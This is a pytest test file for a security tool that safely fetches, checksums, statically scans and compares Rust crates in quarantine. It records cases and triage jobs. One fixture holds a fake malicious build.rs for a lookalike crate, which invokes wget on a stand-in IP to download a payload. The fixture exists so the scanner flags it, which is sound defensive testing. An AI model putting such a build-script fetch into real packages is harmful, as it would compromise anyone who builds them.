from __future__ import annotations

import hashlib
import io
import json
import tarfile
from pathlib import Path

import pytest

import soc_store
from secopsai.artifact_fleet import triage_show
from secopsai.research_intake import IntakeError, SafeFetcher, collect_package_intake, preview_package
from secopsai.rust_package_research import run_rust_package_research


def _crate_bytes(source: str) -> bytes:
    output = io.BytesIO()
    with tarfile.open(fileobj=output, mode="w:gz") as archive:
        data = source.encode("utf-8")
        member = tarfile.TarInfo("build.rs")
        member.size = len(data)
        archive.addfile(member, io.BytesIO(data))
    return output.getvalue()


def _fetcher(artifacts: dict[str, bytes], metadata: dict[str, dict]) -> SafeFetcher:
    def fetch(url: str, _max_bytes: int):
        if "/api/v1/crates/" in url and not url.endswith("/download"):
            package = url.rsplit("/", 1)[-1]
            return 200, {"content-type": "application/json"}, json.dumps(metadata[package]).encode()
        package = url.split("/crates/", 1)[1].split("/", 1)[0]
        return 200, {"content-type": "application/octet-stream"}, artifacts[package]

    return SafeFetcher(fetch=fetch)


def _metadata(package: str, version: str, digest: str) -> dict:
    return {
        "crate": {
            "id": package,
            "repository": f"https://github.com/fixture/{package}",
            "description": "Fixture crate metadata",
        },
        "versions": [{"num": version, "created_at": "2026-08-20T00:00:00Z", "checksum": digest, "yanked": False}],
    }


def test_crates_metadata_preview_is_exact_and_non_downloading():
    artifact = _crate_bytes("fn main() {}")
    digest = hashlib.sha256(artifact).hexdigest()
    fetcher = _fetcher({"proc-macro1": artifact}, {"proc-macro1": _metadata("proc-macro1", "1.0.107", digest)})
    result = preview_package(ecosystem="crates", package="proc-macro1", version="1.0.107", fetcher=fetcher)
    assert result["metadata"]["version"] == "1.0.107"
    assert result["metadata"]["source_repository"].endswith("/proc-macro1")
    assert result["metadata"]["contacts"]["names"] == []
    assert result["safety"]["execution_performed"] is False


def test_rust_research_collects_scans_compares_and_reuses_case(tmp_path, monkeypatch):
    monkeypatch.setenv("SECOPSAI_RESEARCH_QUARANTINE", str(tmp_path / "quarantine"))
    suspicious = _crate_bytes(
        "use std::process::Command;\nfn main() { let _ = Command::new(\"wget\").arg(\"https://198.51.100.20:9089/payload\"); }\n"
    )
    legitimate = _crate_bytes("fn main() {}\n")
    artifacts = {"proc-macro1": suspicious, "proc-macro2": legitimate}
    metadata = {
        "proc-macro1": _metadata("proc-macro1", "1.0.107", hashlib.sha256(suspicious).hexdigest()),
        "proc-macro2": _metadata("proc-macro2", "1.0.107", hashlib.sha256(legitimate).hexdigest()),
    }
    fetcher = _fetcher(artifacts, metadata)
    db_path = str(tmp_path / "soc.db")
    artifact_db = str(tmp_path / "artifact.db")
    result = run_rust_package_research(
        package="proc-macro1",
        version="1.0.107",
        compare_package="proc-macro2",
        compare_version="1.0.107",
        source_reference="https://research.example/rust-crates",
        persist_findings=True,
        model="fixture/model",
        db_path=db_path,
        artifact_db_path=artifact_db,
        fetcher=fetcher,
    )
    assert result["ok"] is True
    assert result["scan"]["status"] == "flagged"
    assert result["artifact"]["execution_performed"] is False
    assert result["comparison"]["safety"]["execution_performed"] is False
    assert result["case_id"].startswith("RSC-")
    assert result["model_job"]["job"]["action"] == "triage_artifact"
    assert triage_show(result["artifact"]["artifact_id"], db_path=artifact_db)["context"]["execution_performed"] is False
    from secopsai.intelligence import prepare_bridge_request
    bridge_request = prepare_bridge_request(
        "triage_artifact",
        {"artifact_id": result["artifact"]["artifact_id"], "artifact_db_path": artifact_db},
        db_path=db_path,
    )
    assert bridge_request["context"]["artifact_triage"]["execution_performed"] is False
    assert "artifact_content" not in bridge_request["context"]
    with soc_store.connect(db_path) as connection:
        assert connection.execute("SELECT COUNT(*) FROM findings").fetchone()[0] == 1
        assert connection.execute("SELECT COUNT(*) FROM research_evidence").fetchone()[0] >= 4
        assert connection.execute("SELECT COUNT(*) FROM intelligence_jobs").fetchone()[0] == 1

    repeated = run_rust_package_research(
        package="proc-macro1",
        version="1.0.107",
        compare_package="proc-macro2",
        compare_version="1.0.107",
        source_reference="https://research.example/rust-crates",
        persist_findings=True,
        model="fixture/model",
        db_path=db_path,
        artifact_db_path=artifact_db,
        fetcher=fetcher,
    )
    assert repeated["case_id"] == result["case_id"]
    with soc_store.connect(db_path) as connection:
        assert connection.execute("SELECT COUNT(*) FROM research_cases").fetchone()[0] == 1


def test_rust_research_rejects_checksum_mismatch(tmp_path, monkeypatch):
    monkeypatch.setenv("SECOPSAI_RESEARCH_QUARANTINE", str(tmp_path / "quarantine"))
    artifact = _crate_bytes("fn main() {}")
    bad_metadata = {"proc-macro1": _metadata("proc-macro1", "1.0.107", "0" * 64)}
    with pytest.raises(IntakeError, match="checksum"):
        run_rust_package_research(
            package="proc-macro1",
            version="1.0.107",
            db_path=str(tmp_path / "soc.db"),
            artifact_db_path=str(tmp_path / "artifact.db"),
            fetcher=_fetcher({"proc-macro1": artifact}, bad_metadata),
        )


def test_rust_research_dry_run_does_not_create_quarantine_or_case(tmp_path, monkeypatch):
    monkeypatch.setenv("SECOPSAI_RESEARCH_QUARANTINE", str(tmp_path / "quarantine"))
    artifact = _crate_bytes("fn main() {}")
    digest = hashlib.sha256(artifact).hexdigest()
    fetcher = _fetcher({"proc-macro1": artifact}, {"proc-macro1": _metadata("proc-macro1", "1.0.107", digest)})
    result = run_rust_package_research(
        package="proc-macro1",
        version="1.0.107",
        dry_run=True,
        db_path=str(tmp_path / "soc.db"),
        artifact_db_path=str(tmp_path / "artifact.db"),
        fetcher=fetcher,
    )
    assert result["dry_run"] is True
    assert result["safety"]["downloaded"] is False
    assert not (tmp_path / "quarantine").exists()


def test_rust_research_can_keep_a_static_result_out_of_cases(tmp_path, monkeypatch):
    monkeypatch.setenv("SECOPSAI_RESEARCH_QUARANTINE", str(tmp_path / "quarantine"))
    artifact = _crate_bytes("use std::process::Command; fn main() { let _ = Command::new(\"wget\"); }")
    digest = hashlib.sha256(artifact).hexdigest()
    result = run_rust_package_research(
        package="proc-macro1",
        version="1.0.107",
        create_research_case=False,
        db_path=str(tmp_path / "soc.db"),
        artifact_db_path=str(tmp_path / "artifact.db"),
        fetcher=_fetcher({"proc-macro1": artifact}, {"proc-macro1": _metadata("proc-macro1", "1.0.107", digest)}),
    )
    assert result["scan"]["status"] == "flagged"
    assert result["case_id"] is None
    assert result["model_job"] is None
